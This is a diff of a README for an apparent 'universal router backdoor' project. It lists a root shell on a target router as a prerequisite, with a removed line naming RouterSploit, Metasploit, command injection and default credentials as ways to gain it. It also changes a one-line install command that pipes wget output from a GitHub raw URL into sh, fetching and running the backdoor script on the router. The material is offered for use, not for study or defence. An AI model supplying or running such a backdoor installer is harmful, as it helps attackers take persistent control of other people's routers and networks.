@@ -71,11 +71,11 @@ The script probes the router for these tools in order and installs accordingly:
 
 ### Prerequisites
 
-- **Root shell** on the target router (obtained via RouterSploit, Metasploit, command injection, default credentials, etc.)
+- **Root shell** on the target router
 - **Internet access** on the router (to download the script) OR ability to host the script on your local machine
 
 ### From GitHub (Router Has Internet Access)
 
 ```bash
 # From the router's root shell — one command:
-wget -qO- https://raw.githubusercontent.com/YOUR_USERNAME/universal-router-backdoor/main/universal_backdoor.sh | sh
+wget -qO- https://raw.githubusercontent.com/maniopsecgit/universal-router-backdoor/main/universal_backdoor.sh | sh
